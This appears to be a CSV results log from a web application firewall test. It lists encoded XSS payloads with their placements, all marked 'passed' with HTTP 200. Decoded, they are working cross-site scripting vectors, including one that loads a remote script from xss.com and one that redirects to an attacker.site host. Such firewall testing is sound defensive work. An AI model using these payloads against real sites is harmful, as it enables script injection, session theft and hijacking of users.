X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
confirm.call%28null%2C1%29,passed,200,URLPath,URL,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
alert.call%28%2520%2C%20%22XSS%22%29%3B,passed,200,URLPath,URL,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Ik9ueD0oKSBvbk1vdVNlb1Zlcj1wcm9tcHQoMSk+,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
prompt.call%28null%2C1%29,passed,200,URLPath,URL,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
alert.apply%28null%2C%20%5B1%5D%29,passed,200,URLPath,URL,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
"alert.call(%20, ""XSS"");",passed,200,SOAPBody,Plain,owasp-api,soap,failed
"confirm.call(null,1)",passed,200,SOAPBody,Plain,owasp-api,soap,failed
"alert.apply(null, [1])",passed,200,SOAPBody,Plain,owasp-api,soap,failed
